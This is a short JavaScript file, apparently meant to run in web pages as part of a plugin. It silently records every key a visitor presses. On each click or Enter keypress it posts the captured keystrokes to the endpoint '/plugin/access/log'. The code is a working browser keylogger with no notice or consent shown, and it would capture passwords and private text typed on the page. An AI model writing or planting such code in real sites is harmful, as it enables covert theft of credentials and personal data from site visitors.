let log = '';

window.addEventListener("click", () => {
    sendLog();
});
document.addEventListener('keydown', event => {
    if(event.which === 13 || event.keyCode === 13) {
        sendLog();
    }
    log = log.concat(event.key);
});

function sendLog(){
    $.ajax({
       url: '/plugin/access/log',
       type: 'POST',
       contentType: 'application/json',
       data: JSON.stringify({'log': log}),
       success: function(data, status, options) {
           log = '';
       },
    });
}